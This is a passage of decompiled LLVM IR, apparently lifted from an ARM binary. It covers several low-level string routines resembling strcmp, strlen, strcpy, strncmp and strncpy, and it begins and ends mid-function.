  uselistorder i32 %v0_ef74, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 2, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 5, 2, 0, 8, 7, 1, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_efd8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_efb0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f010(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_f014.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f010

dec_label_pc_f010:                                ; preds = %bb3, %bb
  %v0_f014 = phi i32 [ %v0_f014.pre, %bb ], [ %v5_f014, %bb3 ]
  %v0_f010 = phi i32 [ %tmp, %bb ], [ %v5_f010, %bb3 ]
  %v1_f010 = inttoptr i32 %v0_f010 to i8*
  %v2_f010 = load i8, i8* %v1_f010, align 1
  %v1_f014 = inttoptr i32 %v0_f014 to i8*
  %v2_f014 = load i8, i8* %v1_f014, align 1
  %v3_f014 = zext i8 %v2_f014 to i32
  %v2_f018 = icmp eq i8 %v2_f010, 0
  br i1 %v2_f018, label %.dec_label_pc_f024_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_f010
  %v5_f014 = add i32 %v0_f014, 1
  %v5_f010 = add i32 %v0_f010, 1
  %v3_f010 = zext i8 %v2_f010 to i32
  %v10_f01c = icmp eq i8 %v2_f010, %v2_f014
  br i1 %v10_f01c, label %dec_label_pc_f010, label %dec_label_pc_f024

.dec_label_pc_f024_crit_edge:                     ; preds = %dec_label_pc_f010
  br label %dec_label_pc_f024

dec_label_pc_f024:                                ; preds = %bb3, %.dec_label_pc_f024_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_f024_crit_edge ], [ %v3_f010, %bb3 ]
  %v2_f024.pre-phi = sub nsw i32 %.pn, %v3_f014
  ret i32 %v2_f024.pre-phi

; uselistorder directives
  uselistorder i8 %v2_f010, { 0, 2, 1 }
  uselistorder i32 %v0_f010, { 1, 0 }
  uselistorder i32 %v0_f014, { 1, 0 }
  uselistorder label %dec_label_pc_f024, { 1, 0 }
}

define i32 @function_f030() local_unnamed_addr {
dec_label_pc_f030:
  %v0_f030 = load i32, i32* @r0, align 4
  %v1_f030 = and i32 %v0_f030, -4
  %v1_f034 = inttoptr i32 %v1_f030 to i32*
  %v2_f034 = load i32, i32* %v1_f034, align 4
  %v1_f038 = urem i32 %v0_f030, 4
  %v2_f038 = icmp eq i32 %v1_f038, 0
  %v1_f03c = sub nsw i32 0, %v1_f038
  br i1 %v2_f038, label %.preheader.preheader, label %dec_label_pc_f044

dec_label_pc_f044:                                ; preds = %dec_label_pc_f030
  %v1_f044 = or i32 %v2_f034, 255
  %v7_f048 = icmp eq i32 %v1_f038, 1
  br i1 %v7_f048, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_f044
  %v9_f04c = or i32 %v2_f034, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_f044, %bb
  %v8_f054 = phi i32 [ %v1_f044, %dec_label_pc_f044 ], [ %v9_f04c, %bb ]
  %v7_f054 = icmp eq i32 %v1_f038, 3
  br i1 %v7_f054, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_f054 = or i32 %v8_f054, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_f030
  %v1_f064.ph = phi i32 [ %v2_f034, %dec_label_pc_f030 ], [ %v9_f054, %bb34 ], [ %v8_f054, %bb33 ]
  %v1_f05838 = urem i32 %v1_f064.ph, 256
  %v2_f05839 = icmp eq i32 %v1_f05838, 0
  %v2_f05c40 = and i32 %v1_f064.ph, 65280
  %v3_f05c41 = icmp eq i32 %v2_f05c40, 0
  %or.cond42 = or i1 %v2_f05839, %v3_f05c41
  %v2_f06043 = and i32 %v1_f064.ph, 16711680
  %v3_f06044 = icmp eq i32 %v2_f06043, 0
  %or.cond3145 = or i1 %v3_f06044, %or.cond42
  %v4_f06446 = icmp ult i32 %v1_f064.ph, 16777216
  %or.cond3247 = or i1 %v4_f06446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_f074, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_f0681349 = phi i32 [ %v2_f06814, %.thread4 ], [ %v1_f03c, %.preheader.preheader ]
  %v1_f06c48.in = phi i32 [ %v1_f06c48, %.thread4 ], [ %v1_f030, %.preheader.preheader ]
  %v1_f06c48 = add i32 %v1_f06c48.in, 4
  %v2_f06814 = add i32 %v1_f0681349, 4
  %v2_f06c = inttoptr i32 %v1_f06c48 to i32*
  %v3_f06c = load i32, i32* %v2_f06c, align 4
  %v1_f058 = urem i32 %v3_f06c, 256
  %v2_f058 = icmp eq i32 %v1_f058, 0
  %v2_f05c = and i32 %v3_f06c, 65280
  %v3_f05c = icmp eq i32 %v2_f05c, 0
  %or.cond = or i1 %v2_f058, %v3_f05c
  %v2_f060 = and i32 %v3_f06c, 16711680
  %v3_f060 = icmp eq i32 %v2_f060, 0
  %or.cond31 = or i1 %v3_f060, %or.cond
  %v4_f064 = icmp ult i32 %v3_f06c, 16777216
  %or.cond32 = or i1 %v4_f064, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_f074, label %.thread4

dec_label_pc_f074:                                ; preds = %.thread4, %.preheader.preheader
  %v1_f06813.lcssa = phi i32 [ %v1_f03c, %.preheader.preheader ], [ %v2_f06814, %.thread4 ]
  %v2_f058.lcssa = phi i1 [ %v2_f05839, %.preheader.preheader ], [ %v2_f058, %.thread4 ]
  %v3_f05c.lcssa = phi i1 [ %v3_f05c41, %.preheader.preheader ], [ %v3_f05c, %.thread4 ]
  %v3_f060.lcssa = phi i1 [ %v3_f06044, %.preheader.preheader ], [ %v3_f060, %.thread4 ]
  br i1 %v2_f058.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_f074
  %v2_f078 = add i32 %v1_f06813.lcssa, 1
  br i1 %v3_f05c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_f08017 = add i32 %v1_f06813.lcssa, 2
  br i1 %v3_f060.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_f088 = add i32 %v1_f06813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_f074, %bb35, %bb36, %bb37
  %v1_f08c = phi i32 [ %v2_f078, %bb35 ], [ %v2_f08017, %bb36 ], [ %v2_f088, %bb37 ], [ %v1_f06813.lcssa, %dec_label_pc_f074 ]
  ret i32 %v1_f08c

; uselistorder directives
  uselistorder i32 %v1_f06813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_f06c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_f064.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f038, { 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_f090(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_f090:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_f090 = sub i32 %arg1, %tmp
  %v1_f094 = add i32 %v2_f090, -1
  store i32 %v1_f094, i32* @r2, align 4
  %v2_f0984 = load i8, i8* %arg2, align 1
  %v5_f0986 = add i32 %tmp, 1
  store i32 %v5_f0986, i32* %r1.global-to-local, align 4
  %v2_f09c7 = icmp eq i8 %v2_f0984, 0
  store i1 %v2_f09c7, i1* %cpsr_z.global-to-local, align 1
  %v5_f0a08 = inttoptr i32 %arg1 to i8*
  store i8 %v2_f0984, i8* %v5_f0a08, align 1
  %v0_f0a49 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0a49, label %dec_label_pc_f0a8, label %dec_label_pc_f098.dec_label_pc_f098_crit_edge

dec_label_pc_f098.dec_label_pc_f098_crit_edge:    ; preds = %dec_label_pc_f090, %dec_label_pc_f098.dec_label_pc_f098_crit_edge
  %v0_f098.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_f0a0.pre = load i32, i32* @r2, align 4
  %v1_f098 = inttoptr i32 %v0_f098.pre to i8*
  %v2_f098 = load i8, i8* %v1_f098, align 1
  %v5_f098 = add i32 %v0_f098.pre, 1
  store i32 %v5_f098, i32* %r1.global-to-local, align 4
  %v2_f09c = icmp eq i8 %v2_f098, 0
  store i1 %v2_f09c, i1* %cpsr_z.global-to-local, align 1
  %v4_f0a0 = add i32 %v5_f098, %v3_f0a0.pre
  %v5_f0a0 = inttoptr i32 %v4_f0a0 to i8*
  store i8 %v2_f098, i8* %v5_f0a0, align 1
  %v0_f0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0a4, label %dec_label_pc_f0a8, label %dec_label_pc_f098.dec_label_pc_f098_crit_edge

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f098.dec_label_pc_f098_crit_edge, %dec_label_pc_f090
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f098.dec_label_pc_f098_crit_edge, { 1, 0 }
}

define i32 @function_f0ac(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f0ac:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_f0ac = load i32, i32* %r2.global-to-local, align 4
  %v0_f0b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f0b4, i32* @lr, align 4
  %tmp143 = icmp ult i32 %v0_f0ac, 4
  br i1 %tmp143, label %.thread59, label %dec_label_pc_f0e0

.thread59:                                        ; preds = %dec_label_pc_f0ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f1bcthread-pre-split

dec_label_pc_f0c8:                                ; preds = %thread-pre-split
  store i32 %v2_f11c, i32* %r0.global-to-local, align 4
  ret i32 %v2_f11c

dec_label_pc_f0d0:                                ; preds = %bb74, %.thread6
  store i32 %v2_f144, i32* %r0.global-to-local, align 4
  ret i32 %v2_f144

dec_label_pc_f0d8:                                ; preds = %bb77, %bb68, %.thread14, %.thread10, %.thread, %bb80
  %v1_f0d8 = phi i32 [ 0, %.thread14 ], [ 0, %.thread10 ], [ 0, %.thread ], [ %v3_f194, %bb80 ], [ %v4_f15c, %bb77 ], [ %v3_f0e4, %bb68 ]
  %v0_f0d8 = phi i32 [ %v3_f198, %.thread14 ], [ %v4_f160, %.thread10 ], [ %v3_f0e8, %.thread ], [ %v3_f198, %bb80 ], [ %v4_f160, %bb77 ], [ %v3_f0e8, %bb68 ]
  %v2_f0d8 = sub nsw i32 %v1_f0d8, %v0_f0d8
  store i32 %v2_f0d8, i32* %r0.global-to-local, align 4
  ret i32 %v2_f0d8

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0ac
  %v3_f0e0 = udiv i32 %v0_f0ac, 4
  %v0_f0e8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f0e4

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f184, %dec_label_pc_f0e0
  %v0_f184 = phi i32 [ %v1_f184, %dec_label_pc_f184 ], [ %v3_f0e0, %dec_label_pc_f0e0 ]
  %v0_f12c = phi i32 [ %v1_f168, %dec_label_pc_f184 ], [ %v0_f0e8.pre, %dec_label_pc_f0e0 ]
  %v0_f104 = phi i32 [ %v1_f118, %dec_label_pc_f184 ], [ %v0_f0b4, %dec_label_pc_f0e0 ]
  %v1_f0e4 = inttoptr i32 %v0_f104 to i8*
  %v2_f0e4 = load i8, i8* %v1_f0e4, align 1
  %v3_f0e4 = zext i8 %v2_f0e4 to i32
  store i32 %v3_f0e4, i32* %r0.global-to-local, align 4
  %v1_f0e8 = inttoptr i32 %v0_f12c to i8*
  %v2_f0e8 = load i8, i8* %v1_f0e8, align 1
  %v3_f0e8 = zext i8 %v2_f0e8 to i32
  %v2_f0ec = sub nsw i32 %v3_f0e4, %v3_f0e8
  %v9_f0ec = icmp eq i8 %v2_f0e4, %v2_f0e8
  br i1 %v9_f0ec, label %bb67, label %bb

bb:                                               ; preds = %dec_label_pc_f0e4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_f0e4, %bb
  %v1_f0f8 = phi i32 [ %v2_f0ec, %dec_label_pc_f0e4 ], [ 1, %bb ]
  %v2_f0f4 = icmp eq i8 %v2_f0e4, 0
  br i1 %v2_f0f4, label %.thread, label %bb68

.thread:                                          ; preds = %bb67
  br label %dec_label_pc_f0d8

bb68:                                             ; preds = %bb67
  %v2_f0fc = icmp eq i32 %v1_f0f8, 0
  br i1 %v2_f0fc, label %dec_label_pc_f104, label %dec_label_pc_f0d8

dec_label_pc_f104:                                ; preds = %bb68
  %v1_f104 = add i32 %v0_f104, 1
  %v2_f108 = inttoptr i32 %v1_f104 to i8*
  %v3_f108 = load i8, i8* %v2_f108, align 1
  %v4_f108 = zext i8 %v3_f108 to i32
  store i32 %v4_f108, i32* %r0.global-to-local, align 4
  %v1_f10c = add i32 %v0_f12c, 1
  %v2_f10c = inttoptr i32 %v1_f10c to i8*
  %v3_f10c = load i8, i8* %v2_f10c, align 1
  %v4_f10c = zext i8 %v3_f10c to i32
  %v1_f110 = add i32 %v0_f104, 2
  %v1_f118 = add i32 %v0_f104, 4
  store i32 %v1_f118, i32* @lr, align 4
  %v2_f11c = sub nsw i32 %v4_f108, %v4_f10c
  %v9_f11c = icmp eq i8 %v3_f108, %v3_f10c
  br i1 %v9_f11c, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_f104
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_f104, %bb69
  %v1_f128 = phi i32 [ %v2_f11c, %dec_label_pc_f104 ], [ 1, %bb69 ]
  %v2_f124 = icmp eq i8 %v3_f108, 0
  br i1 %v2_f124, label %bb71, label %thread-pre-split

bb71:                                             ; preds = %bb70
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb70, %bb71
  %v0_f130 = phi i32 [ 1, %bb71 ], [ %v1_f128, %bb70 ]
  %v2_f130 = icmp eq i32 %v0_f130, 0
  br i1 %v2_f130, label %dec_label_pc_f13c, label %dec_label_pc_f0c8

dec_label_pc_f13c:                                ; preds = %thread-pre-split
  %v1_f134 = add i32 %v0_f12c, 2
  %v2_f13c = inttoptr i32 %v1_f110 to i8*
  %v3_f13c = load i8, i8* %v2_f13c, align 1
  %v4_f13c = zext i8 %v3_f13c to i32
  store i32 %v4_f13c, i32* %r0.global-to-local, align 4
  %v2_f140 = inttoptr i32 %v1_f134 to i8*
  %v3_f140 = load i8, i8* %v2_f140, align 1
  %v4_f140 = zext i8 %v3_f140 to i32
  %v2_f144 = sub nsw i32 %v4_f13c, %v4_f140
  %v9_f144 = icmp eq i8 %v3_f13c, %v3_f140
  br i1 %v9_f144, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_f13c
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_f13c, %bb72
  %v1_f150 = phi i32 [ %v2_f144, %dec_label_pc_f13c ], [ 1, %bb72 ]
  %v2_f14c = icmp eq i8 %v3_f13c, 0
  br i1 %v2_f14c, label %.thread6, label %bb74

.thread6:                                         ; preds = %bb73
  br label %dec_label_pc_f0d0

bb74:                                             ; preds = %bb73
  %v2_f154 = icmp eq i32 %v1_f150, 0
  br i1 %v2_f154, label %dec_label_pc_f15c, label %dec_label_pc_f0d0

dec_label_pc_f15c:                                ; preds = %bb74
  %v1_f15c = add i32 %v0_f104, 3
  %v2_f15c = inttoptr i32 %v1_f15c to i8*
  %v3_f15c = load i8, i8* %v2_f15c, align 1
  %v4_f15c = zext i8 %v3_f15c to i32
  store i32 %v4_f15c, i32* %r0.global-to-local, align 4
  %v1_f160 = add i32 %v0_f12c, 3
  %v2_f160 = inttoptr i32 %v1_f160 to i8*
  %v3_f160 = load i8, i8* %v2_f160, align 1
  %v4_f160 = zext i8 %v3_f160 to i32
  %v1_f168 = add i32 %v0_f12c, 4
  store i32 %v1_f168, i32* @r1, align 4
  %v2_f16c = sub nsw i32 %v4_f15c, %v4_f160
  %v9_f16c = icmp eq i8 %v3_f15c, %v3_f160
  br i1 %v9_f16c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_f15c
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_f15c, %bb75
  %v1_f178 = phi i32 [ %v2_f16c, %dec_label_pc_f15c ], [ 1, %bb75 ]
  %v2_f174 = icmp eq i8 %v3_f15c, 0
  br i1 %v2_f174, label %.thread10, label %bb77

.thread10:                                        ; preds = %bb76
  br label %dec_label_pc_f0d8

bb77:                                             ; preds = %bb76
  %v2_f17c = icmp eq i32 %v1_f178, 0
  br i1 %v2_f17c, label %dec_label_pc_f184, label %dec_label_pc_f0d8

dec_label_pc_f184:                                ; preds = %bb77
  %v1_f184 = add i32 %v0_f184, -1
  %v7_f184 = icmp eq i32 %v0_f184, 1
  br i1 %v7_f184, label %dec_label_pc_f18c, label %dec_label_pc_f0e4

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f184
  %v1_f18c = urem i32 %v0_f0ac, 4
  store i32 %v1_f18c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f1bc

dec_label_pc_f194:                                ; preds = %dec_label_pc_f1bc
  %v1_f194 = inttoptr i32 %v0_f1b4 to i8*
  %v2_f194 = load i8, i8* %v1_f194, align 1
  %v3_f194 = zext i8 %v2_f194 to i32
  store i32 %v3_f194, i32* %r0.global-to-local, align 4
  %v0_f198 = load i32, i32* @r1, align 4
  %v1_f198 = inttoptr i32 %v0_f198 to i8*
  %v2_f198 = load i8, i8* %v1_f198, align 1
  %v3_f198 = zext i8 %v2_f198 to i32
  %v2_f19c = sub nsw i32 %v3_f194, %v3_f198
  %v9_f19c = icmp eq i8 %v2_f194, %v2_f198
  br i1 %v9_f19c, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_f194
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_f194, %bb78
  %v1_f1a8 = phi i32 [ %v2_f19c, %dec_label_pc_f194 ], [ 1, %bb78 ]
  %v2_f1a4 = icmp eq i8 %v2_f194, 0
  br i1 %v2_f1a4, label %.thread14, label %bb80

.thread14:                                        ; preds = %bb79
  br label %dec_label_pc_f0d8

bb80:                                             ; preds = %bb79
  %v2_f1ac = icmp eq i32 %v1_f1a8, 0
  br i1 %v2_f1ac, label %dec_label_pc_f1b4, label %dec_label_pc_f0d8

dec_label_pc_f1b4:                                ; preds = %bb80
  %v1_f1b4 = add i32 %v0_f1b4, 1
  store i32 %v1_f1b4, i32* @lr, align 4
  %v1_f1b8 = add i32 %v0_f198, 1
  store i32 %v1_f1b8, i32* @r1, align 4
  br label %dec_label_pc_f1bcthread-pre-split

dec_label_pc_f1bcthread-pre-split:                ; preds = %.thread59, %dec_label_pc_f1b4
  %v0_f1c8142 = phi i32 [ %v3_f198, %dec_label_pc_f1b4 ], [ 0, %.thread59 ]
  %v1_f1c854 = phi i32 [ %v3_f194, %dec_label_pc_f1b4 ], [ 0, %.thread59 ]
  %v0_f19447 = phi i32 [ %v1_f1b4, %dec_label_pc_f1b4 ], [ %v0_f0b4, %.thread59 ]
  %v0_f1bc.pr = phi i32 [ %v1_f1c0, %dec_label_pc_f1b4 ], [ %v0_f0ac, %.thread59 ]
  br label %dec_label_pc_f1bc

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f1bcthread-pre-split, %dec_label_pc_f18c
  %v0_f1c8 = phi i32 [ %v0_f1c8142, %dec_label_pc_f1bcthread-pre-split ], [ %v4_f160, %dec_label_pc_f18c ]
  %v1_f1c8 = phi i32 [ %v1_f1c854, %dec_label_pc_f1bcthread-pre-split ], [ %v4_f15c, %dec_label_pc_f18c ]
  %v0_f1b4 = phi i32 [ %v0_f19447, %dec_label_pc_f1bcthread-pre-split ], [ %v1_f118, %dec_label_pc_f18c ]
  %v0_f1c0 = phi i32 [ %v0_f1bc.pr, %dec_label_pc_f1bcthread-pre-split ], [ %v1_f18c, %dec_label_pc_f18c ]
  %v2_f1bc = icmp eq i32 %v0_f1c0, 0
  %v1_f1c0 = add i32 %v0_f1c0, -1
  store i32 %v1_f1c0, i32* %r2.global-to-local, align 4
  br i1 %v2_f1bc, label %dec_label_pc_f1c8, label %dec_label_pc_f194

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1bc
  %v2_f1c8 = sub nsw i32 %v1_f1c8, %v0_f1c8
  store i32 %v2_f1c8, i32* %r0.global-to-local, align 4
  ret i32 %v2_f1c8

; uselistorder directives
  uselistorder i32 %v1_f1c0, { 1, 0 }
  uselistorder i32 %v0_f1b4, { 1, 0 }
  uselistorder i32 %v3_f198, { 0, 3, 2, 1 }
  uselistorder i32 %v3_f194, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f18c, { 1, 0 }
  uselistorder i32 %v1_f168, { 1, 0 }
  uselistorder i32 %v4_f160, { 1, 3, 2, 0 }
  uselistorder i32 %v4_f15c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f144, { 2, 0, 1 }
  uselistorder i32 %v2_f11c, { 2, 0, 1 }
  uselistorder i32 %v1_f118, { 0, 2, 1 }
  uselistorder i32 %v3_f0e8, { 2, 1, 0 }
  uselistorder i32 %v3_f0e4, { 1, 2, 0 }
  uselistorder i32 %v0_f0ac, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 8, 10, 9, 5, 7, 11, 0, 1 }
  uselistorder label %dec_label_pc_f1bcthread-pre-split, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_f0d8, { 5, 2, 0, 3, 1, 4 }
}

define i32 @function_f1d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f1d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_f1d0 = icmp eq i32 %arg2, 3
  store i1 %v7_f1d0, i1* %cpsr_z.global-to-local, align 1
  %v1_f1d8 = add i32 %arg1, -1
  store i32 %v1_f1d8, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_f254, label %dec_label_pc_f1e0

dec_label_pc_f1e0:                                ; preds = %dec_label_pc_f1d0
  %v3_f1e0 = udiv i32 %arg2, 4
  store i32 %v3_f1e0, i32* @lr, align 4
  %v0_f1e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f1e0
  %v2_f1ec = phi i32 [ %v6_f224, %dec_label_pc_f230 ], [ %v1_f1d8, %dec_label_pc_f1e0 ]
  %v0_f1e4 = phi i32 [ %v1_f234, %dec_label_pc_f230 ], [ %v0_f1e4.pre, %dec_label_pc_f1e0 ]
  %v1_f1e4 = inttoptr i32 %v0_f1e4 to i8*
  %v2_f1e4 = load i8, i8* %v1_f1e4, align 1
  %v3_f1e4 = zext i8 %v2_f1e4 to i32
  store i32 %v3_f1e4, i32* %r3.global-to-local, align 4
  %v2_f1e8 = icmp eq i8 %v2_f1e4, 0
  store i1 %v2_f1e8, i1* %cpsr_z.global-to-local, align 1
  %v3_f1ec = add i32 %v2_f1ec, 1
  %v4_f1ec = inttoptr i32 %v3_f1ec to i8*
  store i8 %v2_f1e4, i8* %v4_f1ec, align 1
  %v5_f1ec = load i32, i32* %ip.global-to-local, align 4
  %v6_f1ec = add i32 %v5_f1ec, 1
  store i32 %v6_f1ec, i32* %ip.global-to-local, align 4
  %v0_f1f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f1f0, label %dec_label_pc_f240, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1e4
  %v0_f1f4 = load i32, i32* @r1, align 4
  %v1_f1f4 = add i32 %v0_f1f4, 1
  %v2_f1f4 = inttoptr i32 %v1_f1f4 to i8*
  %v3_f1f4 = load i8, i8* %v2_f1f4, align 1
  %v4_f1f4 = zext i8 %v3_f1f4 to i32
  store i32 %v4_f1f4, i32* %r3.global-to-local, align 4
  %v2_f1f8 = icmp eq i8 %v3_f1f4, 0
  store i1 %v2_f1f8, i1* %cpsr_z.global-to-local, align 1
  %v3_f1fc = add i32 %v5_f1ec, 2
  %v4_f1fc = inttoptr i32 %v3_f1fc to i8*
  store i8 %v3_f1f4, i8* %v4_f1fc, align 1
  %v5_f1fc = load i32, i32* %ip.global-to-local, align 4
  %v6_f1fc = add i32 %v5_f1fc, 1
  store i32 %v6_f1fc, i32* %ip.global-to-local, align 4
  %v0_f200 = load i32, i32* @r1, align 4
  %v1_f200 = add i32 %v0_f200, 1
  store i32 %v1_f200, i32* %r1.global-to-local, align 4
  %v0_f204 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f204, label %dec_label_pc_f240, label %dec_label_pc_f208

dec_label_pc_f208:                                ; preds = %dec_label_pc_f1f4
  %v1_f208 = add i32 %v0_f200, 2
  %v2_f208 = inttoptr i32 %v1_f208 to i8*
  %v3_f208 = load i8, i8* %v2_f208, align 1
  %v4_f208 = zext i8 %v3_f208 to i32
  store i32 %v4_f208, i32* %r3.global-to-local, align 4
  %v2_f20c = icmp eq i8 %v3_f208, 0
  store i1 %v2_f20c, i1* %cpsr_z.global-to-local, align 1
  %v3_f210 = add i32 %v5_f1fc, 2
  %v4_f210 = inttoptr i32 %v3_f210 to i8*
  store i8 %v3_f208, i8* %v4_f210, align 1
  %v5_f210 = load i32, i32* %ip.global-to-local, align 4
  %v6_f210 = add i32 %v5_f210, 1
  store i32 %v6_f210, i32* %ip.global-to-local, align 4
  %v0_f214 = load i32, i32* %r1.global-to-local, align 4
  %v1_f214 = add i32 %v0_f214, 1
  store i32 %v1_f214, i32* %r1.global-to-local, align 4
  %v0_f218 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f218, label %dec_label_pc_f240, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f208
  %v1_f21c = add i32 %v0_f214, 2
  %v2_f21c = inttoptr i32 %v1_f21c to i8*
  %v3_f21c = load i8, i8* %v2_f21c, align 1
  %v4_f21c = zext i8 %v3_f21c to i32
  store i32 %v4_f21c, i32* %r3.global-to-local, align 4
  %v2_f220 = icmp eq i8 %v3_f21c, 0
  store i1 %v2_f220, i1* %cpsr_z.global-to-local, align 1
  %v3_f224 = add i32 %v5_f210, 2
  %v4_f224 = inttoptr i32 %v3_f224 to i8*
  store i8 %v3_f21c, i8* %v4_f224, align 1
  %v5_f224 = load i32, i32* %ip.global-to-local, align 4
  %v6_f224 = add i32 %v5_f224, 1
  store i32 %v6_f224, i32* %ip.global-to-local, align 4
  %v0_f228 = load i32, i32* %r1.global-to-local, align 4
  %v1_f228 = add i32 %v0_f228, 1
  store i32 %v1_f228, i32* %r1.global-to-local, align 4
  %v0_f22c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f22c, label %dec_label_pc_f240, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f21c
  %v0_f230 = load i32, i32* @lr, align 4
  %v1_f230 = add i32 %v0_f230, -1
  store i32 %v1_f230, i32* @lr, align 4
  %v7_f230 = icmp eq i32 %v0_f230, 1
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  %v1_f234 = add i32 %v0_f228, 2
  store i32 %v1_f234, i32* @r1, align 4
  br i1 %v7_f230, label %dec_label_pc_f254, label %dec_label_pc_f1e4

dec_label_pc_f240:                                ; preds = %dec_label_pc_f21c, %dec_label_pc_f208, %dec_label_pc_f1f4, %dec_label_pc_f1e4
  %v1_f240 = phi i32 [ %v6_f224, %dec_label_pc_f21c ], [ %v6_f210, %dec_label_pc_f208 ], [ %v6_f1fc, %dec_label_pc_f1f4 ], [ %v6_f1ec, %dec_label_pc_f1e4 ]
  %v2_f2401 = sub i32 %arg1, %v1_f240
  %v2_f244 = add i32 %v2_f2401, %arg2
  store i32 %v2_f244, i32* %r3.global-to-local, align 4
